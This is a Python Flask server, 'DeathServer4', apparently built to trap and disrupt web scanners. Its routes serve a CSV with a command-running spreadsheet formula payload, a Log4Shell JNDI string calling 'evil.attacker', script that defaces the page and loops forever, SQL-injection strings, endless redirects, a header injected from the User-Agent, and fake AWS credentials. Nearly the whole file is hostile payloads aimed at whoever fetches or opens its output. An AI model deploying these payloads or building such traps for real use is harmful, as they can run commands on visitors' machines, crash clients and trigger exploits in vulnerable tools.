from flask import Flask, Response, request, redirect, make_response
import time, random

app = Flask(__name__)

STYLE_TAG = '<style>body, html { color: white; background-color: white; }</style>'

@app.route('/users.csv')
def evil_csv():
    payload = (
        'id,name,email\n'
        '1,"=cmd|\'/C calc\'!A0","boom@example.com"\n'
        '2,"+SUM(1,2)","=HYPERLINK(\"http://malicious.site\",\"Click\")"\n'
    )
    response = make_response(payload)
    response.headers['Content-Type'] = 'text/csv'
    response.headers['X-CSV-Killer'] = '";=1+1--,'
    return response

@app.route('/data.json')
def bad_json():
    payload = '{"username": "admin", "roles": ["admin", "user",]}'
    return Response(payload, mimetype='application/json')

@app.route('/admin')
def fake_admin():
    return f'''
    <html><head>{STYLE_TAG}</head><body>
    <h1>Admin Panel</h1>
    <form action="/auth" method="POST">
    <input name="user" value="admin"><br>
    <input name="pass" type="password"><br>
    <input type="submit" formaction="javascript:while(true){{}}">
    </form></body></html>
    '''

@app.route('/xss')
def js_trap():
    return f'''
    <html><head>{STYLE_TAG}</head><body>
    <script>
        alert("\uD83D\uDCA3 Gotcha scanner!");
        document.body.innerHTML = "<h1>Owned</h1>";
        while (true) {{}}
    </script>
    </body></html>
    '''

@app.route('/slow')
def slow():
    delay = random.randint(5, 15)
    time.sleep(delay)
    return f"\x07Slow down cowboy. Slept for {delay} seconds.\x07"

@app.route('/loop')
def loop():
    return redirect('/loop2')

@app.route('/loop2')
def loop2():
    return redirect('/loop')

@app.route('/echo')
def echo_agent():
    ua = request.headers.get('User-Agent', 'unknown')
    response = make_response(f"<html><head>{STYLE_TAG}</head><body>User-Agent: {ua}</body></html>")
    response.headers['Set-Cookie'] = f"ua=');=cmd|'{ua}"
    return response

@app.route('/confuse')
def mime_confuse():
    payload = '{"real": "JSON", "but": "text/html"}'
    response = make_response(payload)
    response.headers['Content-Type'] = 'text/html'
    return response

@app.route('/broken')
def broken_status():
    response = make_response("\x07Undefined behavior.\x07")
    response.status_code = 599
    response.headers['X-Broken'] = '1'
    response.headers['Content-Length'] = '-1'
    return response

@app.route('/log4shell')
def log4shell_bait():
    return Response('${jndi:ldap://evil.attacker/pwn}', mimetype='text/plain')

@app.route('/.git/HEAD')
def fake_git():
    return Response("ref: refs/heads/main\n", mimetype='text/plain')

@app.route('/api/aws-creds')
def fake_creds():
    return Response('''{
        "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": "RootToken=="
    }''', mimetype='application/json')

@app.route('/login')
def sqli_bait():
    user = request.args.get('user', "guest'; DROP TABLE users; --")
    password = request.args.get('pass', "' OR '1'='1")
    payload = f'\x07Login failed for {user}. Please contact admin.\x07'
    response = make_response(payload)
    response.headers['X-Debug'] = '\x07\x07\x07 DROP TABLE sessions; --'
    return response

@app.route('/')
def home():
    links = '''
    <ul>
      <li><a href="/users.csv">Poison CSV</a></li>
      <li><a href="/data.json">Broken JSON</a></li>
      <li><a href="/admin">Fake Admin</a></li>
      <li><a href="/xss">JS Bomb</a></li>
      <li><a href="/slow">Slow Response</a></li>
      <li><a href="/loop">Redirect Loop</a></li>
      <li><a href="/echo">User-Agent Trap</a></li>
      <li><a href="/confuse">MIME Confusion</a></li>
      <li><a href="/broken">Broken Status</a></li>
      <li><a href="/.git/HEAD">Fake .git Leak</a></li>
      <li><a href="/log4shell">Log4Shell Bait</a></li>
      <li><a href="/api/aws-creds">Fake AWS Creds</a></li>
      <li><a href="/login?user=admin&pass=password">SQLi Trap</a></li>
    </ul>
    '''
    return f"<html><head>{STYLE_TAG}</head><body><h1>Welcome to DeathServer4™</h1>{links}</body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
